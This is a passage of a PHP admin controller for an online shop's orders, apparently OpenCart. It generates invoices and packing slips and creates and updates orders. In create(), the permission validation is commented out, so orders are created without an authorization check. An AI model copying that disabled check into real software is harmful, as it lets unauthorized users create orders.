			'company'   => $order_info['shipping_company'],
			'address_1' => $order_info['shipping_address_1'],
			'address_2' => $order_info['shipping_address_2'],
			'city'      => $order_info['shipping_city'],
			'postcode'  => $order_info['shipping_postcode'],
			'zone'      => $order_info['shipping_zone'],
			'country'   => $order_info['shipping_country']  
		);
		
		$this->data['shipping_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
		
		if ($order_info['payment_address_format']) {
			$format = $order_info['payment_address_format'];
		} else {
			$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
		}
		
		$find = array(
			'{firstname}',
			'{lastname}',
			'{company}',
			'{address_1}',
			'{address_2}',
			'{city}',
			'{postcode}',
			'{zone}',
			'{country}'
		);
		
		$replace = array(
			'firstname' => $order_info['payment_firstname'],
			'lastname'  => $order_info['payment_lastname'],
			'company'   => $order_info['payment_company'],
			'address_1' => $order_info['payment_address_1'],
			'address_2' => $order_info['payment_address_2'],
			'city'      => $order_info['payment_city'],
			'postcode'  => $order_info['payment_postcode'],
			'zone'      => $order_info['payment_zone'],
			'country'   => $order_info['payment_country']  
		);
		
		$this->data['payment_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
		
		$this->data['products'] = array();
		
		$products = $this->model_sale_order->getOrderProducts($this->request->get['order_id']);
		
		foreach ($products as $product) {
			$option_data = array();
			
			$options = $this->model_sale_order->getOrderOptions($this->request->get['order_id'], $product['order_product_id']);
			
			foreach ($options as $option) {
				$option_data[] = array(
					'name'  => $option['name'],
					'value' => $option['value']
				);
			}
			
			$this->data['products'][] = array(
				'name'     => $product['name'],
				'model'    => $product['model'],
				'option'   => $option_data,
				'quantity' => $product['quantity']
			);
		}
		
		$this->template = 'sale/order_packingslip.tpl';
		
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression'));			
	}
	
	public function invoices() {
		$this->load->language('sale/order');
		
		$this->data['title'] = $this->language->get('heading_title');
			
		if (isset($this->request->server['HTTPS']) && ($this->request->server['HTTPS'] == 'on')) {
			$this->data['base'] = HTTPS_SERVER;
		} else {
			$this->data['base'] = HTTP_SERVER;
		}
		
		$this->data['direction'] = $this->language->get('direction');
		$this->data['language'] = $this->language->get('code');	
		
		$this->data['text_invoice'] = $this->language->get('text_invoice');
		$this->data['text_invoice_date'] = $this->language->get('text_invoice_date');
		$this->data['text_invoice_no'] = $this->language->get('text_invoice_no');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');		
		$this->data['text_to'] = $this->language->get('text_to');
		$this->data['text_ship_to'] = $this->language->get('text_ship_to');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		$this->data['column_price'] = $this->language->get('column_price');
		$this->data['column_total'] = $this->language->get('column_total');	
		
		$this->load->model('sale/order');
		
		$this->data['orders'] = array();
		
		if (isset($this->request->post['selected'])) {
			$orders = $this->request->post['selected'];
		} else {
			$orders = array();
		}
		
		foreach ($orders as $order_id) {
			$order_info = $this->model_sale_order->getOrder($order_id);
			
			if ($order_info) {
				if ($order_info['shipping_address_format']) {
					$format = $order_info['shipping_address_format'];
				} else {
					$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
				}
				
				$find = array(
					'{firstname}',
					'{lastname}',
					'{company}',
					'{address_1}',
					'{address_2}',
					'{city}',
					'{postcode}',
					'{zone}',
					'{country}'
				);
				
				$replace = array(
					'firstname' => $order_info['shipping_firstname'],
					'lastname'  => $order_info['shipping_lastname'],
					'company'   => $order_info['shipping_company'],
					'address_1' => $order_info['shipping_address_1'],
					'address_2' => $order_info['shipping_address_2'],
					'city'      => $order_info['shipping_city'],
					'postcode'  => $order_info['shipping_postcode'],
					'zone'      => $order_info['shipping_zone'],
					'country'   => $order_info['shipping_country']  
				);
				
				$shipping_address = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
				
				if ($order_info['payment_address_format']) {
					$format = $order_info['payment_address_format'];
				} else {
					$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
				}
				
				$find = array(
					'{firstname}',
					'{lastname}',
					'{company}',
					'{address_1}',
					'{address_2}',
					'{city}',
					'{postcode}',
					'{zone}',
					'{country}'
				);
				
				$replace = array(
					'firstname' => $order_info['payment_firstname'],
					'lastname'  => $order_info['payment_lastname'],
					'company'   => $order_info['payment_company'],
					'address_1' => $order_info['payment_address_1'],
					'address_2' => $order_info['payment_address_2'],
					'city'      => $order_info['payment_city'],
					'postcode'  => $order_info['payment_postcode'],
					'zone'      => $order_info['payment_zone'],
					'country'   => $order_info['payment_country']  
				);
				
				$payment_address = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
				
				$product_data = array();
				
				$products = $this->model_sale_order->getOrderProducts($order_id);
				
				foreach ($products as $product) {
					$option_data = array();
					
					$options = $this->model_sale_order->getOrderOptions($order_id, $product['order_product_id']);
					
					foreach ($options as $option) {
						$option_data[] = array(
							'name'  => $option['name'],
							'value' => $option['value']
						);
					}
					
					$product_data[] = array(
						'name'     => $product['name'],
						'model'    => $product['model'],
						'option'   => $option_data,
						'quantity' => $product['quantity'],
						'price'    => $this->currency->format($product['price'], $order_info['currency'], $order_info['value']),
						'total'    => $this->currency->format($product['total'], $order_info['currency'], $order_info['value'])
					);
				}
				
				$total_data = $this->model_sale_order->getOrderTotals($order_id);
				
				$this->data['orders'][] = array(
					'order_id'         => $order_info['order_id'],
					'date_added'       => date($this->language->get('date_format_short'), strtotime($order_info['date_added'])),
					'store'            => $this->config->get('config_store'),
					'address'          => nl2br($this->config->get('config_address')),
					'telephone'        => $this->config->get('config_telephone'),
					'fax'              => $this->config->get('config_fax'),
					'email'            => $this->config->get('config_email'),
					'website'          => trim(HTTP_CATALOG, '/'),
					'shipping_address' => $shipping_address,
					'payment_address'  => $payment_address,
					'product'          => $product_data,
					'total'            => $total_data
				);
			}
		}
		
		$this->template = 'sale/order_invoices.tpl';
			
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression'));
	}
	
	public function packingslips() {
		$this->load->language('sale/order');
		
		$this->data['title'] = $this->language->get('heading_title');
			
		if (isset($this->request->server['HTTPS']) && ($this->request->server['HTTPS'] == 'on')) {
			$this->data['base'] = HTTPS_SERVER;
		} else {
			$this->data['base'] = HTTP_SERVER;
		}
		
		$this->data['direction'] = $this->language->get('direction');
		$this->data['language'] = $this->language->get('code');	
		
		$this->data['text_packingslip'] = $this->language->get('text_packingslip');
		$this->data['text_invoice_date'] = $this->language->get('text_invoice_date');
		$this->data['text_invoice_no'] = $this->language->get('text_invoice_no');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');		
		$this->data['text_to'] = $this->language->get('text_to');
		$this->data['text_ship_to'] = $this->language->get('text_ship_to');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		
		$this->load->model('sale/order');
		
		$this->data['orders'] = array();
		
		if (isset($this->request->post['selected'])) {
			$orders = $this->request->post['selected'];
		} else {
			$orders = array();
		}
		
		foreach ($orders as $order_id) {
			$order_info = $this->model_sale_order->getOrder($order_id);
			
			if ($order_info) {
				if ($order_info['shipping_address_format']) {
					$format = $order_info['shipping_address_format'];
				} else {
					$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
				}
				
				$find = array(
					'{firstname}',
					'{lastname}',
					'{company}',
					'{address_1}',
					'{address_2}',
					'{city}',
					'{postcode}',
					'{zone}',
					'{country}'
				);
				
				$replace = array(
					'firstname' => $order_info['shipping_firstname'],
					'lastname'  => $order_info['shipping_lastname'],
					'company'   => $order_info['shipping_company'],
					'address_1' => $order_info['shipping_address_1'],
					'address_2' => $order_info['shipping_address_2'],
					'city'      => $order_info['shipping_city'],
					'postcode'  => $order_info['shipping_postcode'],
					'zone'      => $order_info['shipping_zone'],
					'country'   => $order_info['shipping_country']  
				);
				
				$shipping_address = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
				
				if ($order_info['payment_address_format']) {
					$format = $order_info['payment_address_format'];
				} else {
					$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
				}
				
				$find = array(
					'{firstname}',
					'{lastname}',
					'{company}',
					'{address_1}',
					'{address_2}',
					'{city}',
					'{postcode}',
					'{zone}',
					'{country}'
				);
				
				$replace = array(
					'firstname' => $order_info['payment_firstname'],
					'lastname'  => $order_info['payment_lastname'],
					'company'   => $order_info['payment_company'],
					'address_1' => $order_info['payment_address_1'],
					'address_2' => $order_info['payment_address_2'],
					'city'      => $order_info['payment_city'],
					'postcode'  => $order_info['payment_postcode'],
					'zone'      => $order_info['payment_zone'],
					'country'   => $order_info['payment_country']  
				);
				
				$payment_address = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
				
				$product_data = array();
				
				$products = $this->model_sale_order->getOrderProducts($order_id);
				
				foreach ($products as $product) {
					$option_data = array();
					
					$options = $this->model_sale_order->getOrderOptions($order_id, $product['order_product_id']);
					
					foreach ($options as $option) {
						$option_data[] = array(
							'name'  => $option['name'],
							'value' => $option['value']
						);
					}
				  
					$product_data[] = array(
						'name'     => $product['name'],
						'model'    => $product['model'],
						'option'   => $option_data,
						'quantity' => $product['quantity']
					);
				}
				
				$this->data['orders'][] = array(
					'order_id'         => $order_info['order_id'],
					'date_added'       => date($this->language->get('date_format_short'), strtotime($order_info['date_added'])),
					'store'            => $this->config->get('config_store'),
					'address'          => nl2br($this->config->get('config_address')),
					'telephone'        => $this->config->get('config_telephone'),
					'fax'              => $this->config->get('config_fax'),
					'email'            => $this->config->get('config_email'),
					'website'          => trim(HTTP_CATALOG, '/'),
					'shipping_address' => $shipping_address,
					'payment_address'  => $payment_address,
					'product'          => $product_data
				);
			}
		}
		
		$this->template = 'sale/order_packingslips.tpl';
			
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression'));
	}
	
	private function validate() {
		if ( ! $this->user->hasPermission('modify', 'sale/order')) {
			$this->error['warning'] = $this->language->get('error_permission'); 
		}
		
		if ( ! $this->error) {
			return TRUE;
		} else {
			return FALSE;
		}
	}
	
	public function create() {
		$this->load->language('sale/order');
	
		$this->document->title = $this->language->get('heading_title');
		
		$this->load->model('sale/order');
		
		if (($this->request->server['REQUEST_METHOD'] == 'POST')) {// && ($this->validateCreate())) {
			$mail = $this->request->post['email'];
			$id = $this->db->query("SELECT * FROM " . DB_PREFIX . "`customer` WHERE email='" . $this->db->escape($mail) . "'");
			if ($id->num_rows == 0)
			{
			$id = 0;
			}
			else
			{
			$id = $id->row['customer_id'];
			}
			$this->request->post['customer_id'] = $id;
			$this->model_sale_order->createOrder($this->request->post);
			$this->session->data['success'] = $this->language->get('text_success');
			
			$url = '';
			
			if (isset($this->request->get['filter_order_id'])) {
				$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
			}
			
			if (isset($this->request->get['filter_name'])) {
				$url .= '&filter_name=' . $this->request->get['filter_name'];
			}
			
			if (isset($this->request->get['filter_order_status_id'])) {
				$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
			}
			
			if (isset($this->request->get['filter_date_added'])) {
				$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
			}
			
			if (isset($this->request->get['filter_total'])) {
				$url .= '&filter_total=' . $this->request->get['filter_total'];
			}
			
			if (isset($this->request->get['page'])) {
				$url .= '&page=' . $this->request->get['page'];
			}
			
			if (isset($this->request->get['sort'])) {
				$url .= '&sort=' . $this->request->get['sort'];
			}
			
			if (isset($this->request->get['order'])) {
				$url .= '&order=' . $this->request->get['order'];
			}
			
			$this->redirect($this->url->https('sale/order' . $url));
		}
		
		$this->getFormCreate();
	}
	
	public function update() {
		$this->load->language('sale/order');
	
		$this->document->title = $this->language->get('heading_title');
		
		$this->load->model('sale/order');
		
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && ($this->validateCreate())) {
			$this->model_sale_order->updateOrder($this->request->get['order_id'], $this->request->post);
			
			$this->session->data['success'] = $this->language->get('text_success');
			
			$url = '';
			
			if (isset($this->request->get['filter_order_id'])) {
				$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
			}
			
			if (isset($this->request->get['filter_name'])) {
				$url .= '&filter_name=' . $this->request->get['filter_name'];
			}
			
			if (isset($this->request->get['filter_order_status_id'])) {
				$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
			}
			
			if (isset($this->request->get['filter_date_added'])) {
				$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
			}
			
			if (isset($this->request->get['filter_total'])) {
				$url .= '&filter_total=' . $this->request->get['filter_total'];
			}
			
			if (isset($this->request->get['page'])) {
				$url .= '&page=' . $this->request->get['page'];
			}
			
			if (isset($this->request->get['sort'])) {
				$url .= '&sort=' . $this->request->get['sort'];
			}
			
			if (isset($this->request->get['order'])) {
				$url .= '&order=' . $this->request->get['order'];
			}
			
			$this->redirect($this->url->https('sale/order' . $url));
		}
		
		$this->getFormUpdate();
	}
	
	private function getFormCreate() {
		$this->data['heading_create'] = $this->language->get('heading_create');
		
		$this->data['text_order_details'] = $this->language->get('text_order_details');
		$this->data['text_contact_details'] = $this->language->get('text_contact_details');
		$this->data['text_address_details'] = $this->language->get('text_address_details');
		$this->data['text_products'] = $this->language->get('text_products');
		$this->data['text_downloads'] = $this->language->get('text_downloads');
		$this->data['text_order_history'] = $this->language->get('text_order_history');
		$this->data['text_update'] = $this->language->get('text_update');
		$this->data['text_order'] = $this->language->get('text_order');
		$this->data['text_date_added'] = $this->language->get('text_date_added');
		$this->data['text_email'] = $this->language->get('text_email');
		$this->data['text_firstname'] = $this->language->get('text_firstname');
		$this->data['text_lastname'] = $this->language->get('text_lastname');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');
		$this->data['text_shipping_address'] = $this->language->get('text_shipping_address');
		$this->data['text_shipping_method'] = $this->language->get('text_shipping_method');
		$this->data['text_payment_address'] = $this->language->get('text_payment_address');
		$this->data['text_payment_firstname'] = $this->language->get('text_payment_firstname');
		$this->data['text_payment_lastname'] = $this->language->get('text_payment_lastname');
		$this->data['text_payment_company'] = $this->language->get('text_payment_company');
		$this->data['text_payment_zone'] = $this->language->get('text_payment_zone');
		$this->data['text_payment_country'] = $this->language->get('text_payment_country');
		$this->data['text_payment_city'] = $this->language->get('text_payment_city');
		$this->data['text_payment_postcode'] = $this->language->get('text_payment_postcode');
		$this->data['text_payment_method'] = $this->language->get('text_payment_method');
		$this->data['text_order_comment'] = $this->language->get('text_order_comment');
		$this->data['text_comment'] = $this->language->get('text_comment');
		$this->data['text_status'] = $this->language->get('text_status');
		$this->data['text_notify'] = $this->language->get('text_notify');
		$this->data['text_close'] = $this->language->get('text_close');
		$this->data['text_select'] = $this->language->get('text_select');
		$this->data['text_currency'] = $this->language->get('text_currency');
		$this->data['text_currency_value'] = $this->language->get('text_currency_value');
		$this->data['text_same_address'] = $this->language->get('text_same_address');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		$this->data['column_price'] = $this->language->get('column_price');
		$this->data['column_total'] = $this->language->get('column_total');
		$this->data['column_download'] = $this->language->get('column_download');
		$this->data['column_filename'] = $this->language->get('column_filename');
		$this->data['column_remaining'] = $this->language->get('column_remaining');
		$this->data['column_tax'] = $this->language->get('column_tax');
		$this->data['column_shipping_tax'] = $this->language->get('column_shipping_tax');
		$this->data['column_sub_total'] = $this->language->get('column_sub_total');
		$this->data['column_shipping'] = $this->language->get('column_shipping');
		
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_comment'] = $this->language->get('entry_comment');
		$this->data['entry_notify'] = $this->language->get('entry_notify');
		
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_add_product'] = $this->language->get('button_add_product');
		$this->data['button_calculate_total'] = $this->language->get('button_calculate_total');
		
 		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
		if (isset($this->error['products'])) {
			$this->data['error_products'] = $this->error['products'];
		} else {
			$this->data['error_products'] = '';
		}
		
		if (isset($this->error['payment_country'])) {
			$this->data['error_payment_country'] = $this->error['payment_country'];
		} else {
			$this->data['error_payment_country'] = '';
		}
		
		if (isset($this->error['shipping_country'])) {
			$this->data['error_shipping_country'] = $this->error['shipping_country'];
		} else {
			$this->data['error_shipping_country'] = '';
		}
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if (isset($this->request->get['page'])) {
			$url .= '&page=' . $this->request->get['page'];
		}
		
		if (isset($this->request->get['sort'])) {
			$url .= '&sort=' . $this->request->get['sort'];
		}
		
		if (isset($this->request->get['order'])) {
			$url .= '&order=' . $this->request->get['order'];
		}
		
		$this->document->breadcrumbs = array();
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('common/home'),
			'text'      => $this->language->get('text_home'),
			'separator' => FALSE
		);
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('sale/order'),
			'text'      => $this->language->get('heading_title'),
			'separator' => ' :: '
		);
		
		
		$this->data['action'] = $this->url->https('sale/order/create');
		$this->data['cancel'] = $this->url->https('sale/order' . $url);
		
		$this->load->model('localisation/country');
		$this->data['countries'] = $this->model_localisation_country->getCountries();
		
		if (isset($this->request->post['payment_currency'])) {
			$this->data['payment_currency'] = $this->request->post['payment_currency'];
		} else {
			$this->data['payment_currency'] = '';
		}
		if (isset($this->request->post['currency_value'])) {
			$this->data['currency_value'] = $this->request->post['currency_value'];
		} else {
			$this->data['currency_value'] = '1.00';
		}
		if (isset($this->request->post['total'])) {
			$this->data['total'] = $this->request->post['total'];
		} else {
			$this->data['total'] = '';
		}
		if (isset($this->request->post['payment_method'])) {
			$this->data['payment_method'] = $this->request->post['payment_method'];
		} else {
			$this->data['payment_method'] = '';
		}
		if (isset($this->request->post['shipping_method'])) {
			$this->data['shipping_method'] = $this->request->post['shipping_method'];
		} else {
			$this->data['shipping_method'] = '';
		}
		if (isset($this->request->post['firstname'])) {
			$this->data['firstname'] = $this->request->post['firstname'];
		} else {
			$this->data['firstname'] = '';
		}
		if (isset($this->request->post['firstname'])) {
			$this->data['firstname'] = $this->request->post['firstname'];
		} else {
			$this->data['firstname'] = '';
		}
		if (isset($this->request->post['lastname'])) {
			$this->data['lastname'] = $this->request->post['lastname'];
		} else {
			$this->data['lastname'] = '';
		}
		if (isset($this->request->post['email'])) {
			$this->data['email'] = $this->request->post['email'];
		} else {
			$this->data['email'] = '';
		}
		if (isset($this->request->post['telephone'])) {
			$this->data['telephone'] = $this->request->post['telephone'];
		} else {
			$this->data['telephone'] = '';
		}
		if (isset($this->request->post['fax'])) {
			$this->data['fax'] = $this->request->post['fax'];
		} else {
			$this->data['fax'] = '';
		}
		if (isset($this->request->post['order_status_id'])) {
			$this->data['order_status_id'] = $this->request->post['order_status_id'];
		} else {
			$this->data['order_status_id'] = '';
		}
		if (isset($this->request->post['notify'])) {
			$this->data['notify'] = $this->request->post['notify'];
		} else {
			$this->data['notify'] = '';
		}
		if (isset($this->request->post['comment'])) {
			$this->data['comment'] = $this->request->post['comment'];
		} else {
			$this->data['comment'] = '';
		}
		
		$this->data['shipping_address'] = array();
		if (isset($this->request->post['shipping_firstname'])) {
			$this->data['shipping_address']['firstname'] = $this->request->post['shipping_firstname'];
		} else {
			$this->data['shipping_address']['firstname'] = '';
		}
		if (isset($this->request->post['shipping_lastname'])) {
			$this->data['shipping_address']['lastname'] = $this->request->post['shipping_lastname'];
		} else {
			$this->data['shipping_address']['lastname'] = '';
		}
		if (isset($this->request->post['shipping_company'])) {
			$this->data['shipping_address']['company'] = $this->request->post['shipping_company'];
		} else {
			$this->data['shipping_address']['company'] = '';
		}
		if (isset($this->request->post['shipping_address_1'])) {
			$this->data['shipping_address']['address_1'] = $this->request->post['shipping_address_1'];
		} else {
			$this->data['shipping_address']['address_1'] = '';
		}
		if (isset($this->request->post['shipping_address_2'])) {
			$this->data['shipping_address']['address_2'] = $this->request->post['shipping_address_2'];
		} else {
			$this->data['shipping_address']['address_2'] = '';
		}
		if (isset($this->request->post['shipping_city'])) {
			$this->data['shipping_address']['city'] = $this->request->post['shipping_city'];
		} else {
			$this->data['shipping_address']['city'] = '';
		}
		if (isset($this->request->post['shipping_postcode'])) {
			$this->data['shipping_address']['postcode'] = $this->request->post['shipping_postcode'];
		} else {
			$this->data['shipping_address']['postcode'] = '';
		}
		if (isset($this->request->post['shipping_zone_id'])) {
			$this->data['shipping_address']['zone_id'] = $this->request->post['shipping_zone_id'];
		} else {
			$this->data['shipping_address']['zone_id'] = '';
		}
		if (isset($this->request->post['shipping_country_id'])) {
			$this->data['shipping_address']['country'] = $this->request->post['shipping_country_id'];
		} else {
			$this->data['shipping_address']['country'] = '';
		}
		
		$this->data['payment_address'] = array();
		if (isset($this->request->post['payment_firstname'])) {
			$this->data['payment_address']['firstname'] = $this->request->post['payment_firstname'];
		} else {
			$this->data['payment_address']['firstname'] = '';
		}
		if (isset($this->request->post['payment_lastname'])) {
			$this->data['payment_address']['lastname'] = $this->request->post['payment_lastname'];
		} else {
			$this->data['payment_address']['lastname'] = '';
		}
		if (isset($this->request->post['payment_company'])) {
			$this->data['payment_address']['company'] = $this->request->post['payment_company'];
		} else {
			$this->data['payment_address']['company'] = '';
		}
		if (isset($this->request->post['payment_address_1'])) {
			$this->data['payment_address']['address_1'] = $this->request->post['payment_address_1'];
		} else {
			$this->data['payment_address']['address_1'] = '';
		}
		if (isset($this->request->post['payment_address_2'])) {
			$this->data['payment_address']['address_2'] = $this->request->post['payment_address_2'];
		} else {
			$this->data['payment_address']['address_2'] = '';
		}
		if (isset($this->request->post['payment_city'])) {
			$this->data['payment_address']['city'] = $this->request->post['payment_city'];
		} else {
			$this->data['payment_address']['city'] = '';
		}
		if (isset($this->request->post['payment_postcode'])) {
			$this->data['payment_address']['postcode'] = $this->request->post['payment_postcode'];
		} else {
			$this->data['payment_address']['postcode'] = '';
		}
		if (isset($this->request->post['payment_zone_id'])) {
			$this->data['payment_address']['zone_id'] = $this->request->post['payment_zone_id'];
		} else {
			$this->data['payment_address']['zone_id'] = '';
		}
		if (isset($this->request->post['payment_country_id'])) {
			$this->data['payment_address']['country'] = $this->request->post['payment_country_id'];
		} else {
			$this->data['payment_address']['country'] = '';
		}
		
		if (isset($this->request->post['product_name'])) {
			foreach (array_keys($this->request->post['product_name']) as $order_product) {
				$this->data['order_products'][$order_product]['product_id'] = $order_product;
				$this->data['order_products'][$order_product]['name'] = $this->request->post['product_name'][$order_product];
				$this->data['order_products'][$order_product]['model'] = $this->request->post['product_model'][$order_product];
				$this->data['order_products'][$order_product]['price'] = $this->request->post['product_price'][$order_product];
				$this->data['order_products'][$order_product]['quantity'] = $this->request->post['product_quantity'][$order_product];
				$this->data['order_products'][$order_product]['tax'] = $this->request->post['product_tax'][$order_product];
				$this->data['order_products'][$order_product]['total'] = $this->request->post['product_total'][$order_product];
			}
		} else {
			$this->data['order_products'] = '';
		}
		
		if (isset($this->request->post['weight'])) {
			$this->data['weight'] = $this->request->post['weight'];
		} else {
			$this->data['weight'] = '';
		}
		if (isset($this->request->post['shipping_tax'])) {
			$this->data['shipping_tax'] = $this->request->post['shipping_tax'];
		} else {
			$this->data['shipping_tax'] = '';
		}
		if (isset($this->request->post['tax'])) {
			$this->data['tax'] = $this->request->post['tax'];
		} else {
			$this->data['tax'] = '';
		}
		if (isset($this->request->post['sub_total'])) {
			$this->data['sub_total'] = $this->request->post['sub_total'];
		} else {
			$this->data['sub_total'] = '';
		}
		if (isset($this->request->post['shipping_cost'])) {
			$this->data['shipping_cost'] = $this->request->post['shipping_cost'];
		} else {
			$this->data['shipping_cost'] = '';
		}
		if (isset($this->request->post['total'])) {
			$this->data['total'] = $this->request->post['total'];
		} else {
			$this->data['total'] = '';
		}
		
		$this->load->model('localisation/currency');
		
		$this->data['currencies'] = $this->model_localisation_currency->getCurrencies();
		
		$this->load->model('setting/extension');
		$this->data['payment_methods'] = $this->model_setting_extension->getInstalled('payment');
		$this->data['shipping_methods'] = $this->model_setting_extension->getInstalled('shipping');
		
		$this->load->model('catalog/product');
		$this->data['products'] = $this->model_catalog_product->getProducts();
		
		$this->data['totals'] = array();
		$this->load->model('localisation/order_status');
		$this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();
		
		$this->template = 'sale/order_create.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
		
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression')); 
	}

	private function getFormUpdate() {
		$this->data['heading_create'] = $this->language->get('heading_create');
		
		$this->data['text_order_details'] = $this->language->get('text_order_details');
		$this->data['text_contact_details'] = $this->language->get('text_contact_details');
		$this->data['text_address_details'] = $this->language->get('text_address_details');
		$this->data['text_products'] = $this->language->get('text_products');
		$this->data['text_downloads'] = $this->language->get('text_downloads');
		$this->data['text_order_history'] = $this->language->get('text_order_history');
		$this->data['text_update'] = $this->language->get('text_update');
		$this->data['text_order'] = $this->language->get('text_order');
		$this->data['text_date_added'] = $this->language->get('text_date_added');
		$this->data['text_email'] = $this->language->get('text_email');
		$this->data['text_firstname'] = $this->language->get('text_firstname');
		$this->data['text_lastname'] = $this->language->get('text_lastname');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');
		$this->data['text_shipping_address'] = $this->language->get('text_shipping_address');
		$this->data['text_shipping_method'] = $this->language->get('text_shipping_method');
		$this->data['text_payment_address'] = $this->language->get('text_payment_address');
		$this->data['text_payment_firstname'] = $this->language->get('text_payment_firstname');
		$this->data['text_payment_lastname'] = $this->language->get('text_payment_lastname');
		$this->data['text_payment_company'] = $this->language->get('text_payment_company');
		$this->data['text_payment_zone'] = $this->language->get('text_payment_zone');
		$this->data['text_payment_country'] = $this->language->get('text_payment_country');
		$this->data['text_payment_city'] = $this->language->get('text_payment_city');
		$this->data['text_payment_postcode'] = $this->language->get('text_payment_postcode');
		$this->data['text_payment_method'] = $this->language->get('text_payment_method');
		$this->data['text_order_comment'] = $this->language->get('text_order_comment');
		$this->data['text_comment'] = $this->language->get('text_comment');
		$this->data['text_status'] = $this->language->get('text_status');
		$this->data['text_notify'] = $this->language->get('text_notify');
		$this->data['text_close'] = $this->language->get('text_close');
		$this->data['text_select'] = $this->language->get('text_select');
		$this->data['text_currency'] = $this->language->get('text_currency');
		$this->data['text_currency_value'] = $this->language->get('text_currency_value');
		$this->data['text_same_address'] = $this->language->get('text_same_address');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		$this->data['column_price'] = $this->language->get('column_price');
		$this->data['column_total'] = $this->language->get('column_total');
		$this->data['column_download'] = $this->language->get('column_download');
		$this->data['column_filename'] = $this->language->get('column_filename');
		$this->data['column_remaining'] = $this->language->get('column_remaining');
		$this->data['column_tax'] = $this->language->get('column_tax');
		$this->data['column_shipping_tax'] = $this->language->get('column_shipping_tax');
		$this->data['column_sub_total'] = $this->language->get('column_sub_total');
		$this->data['column_shipping'] = $this->language->get('column_shipping');
		
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_comment'] = $this->language->get('entry_comment');
		$this->data['entry_notify'] = $this->language->get('entry_notify');
		
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_add_product'] = $this->language->get('button_add_product');
		$this->data['button_calculate_total'] = $this->language->get('button_calculate_total');
		
		
 		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
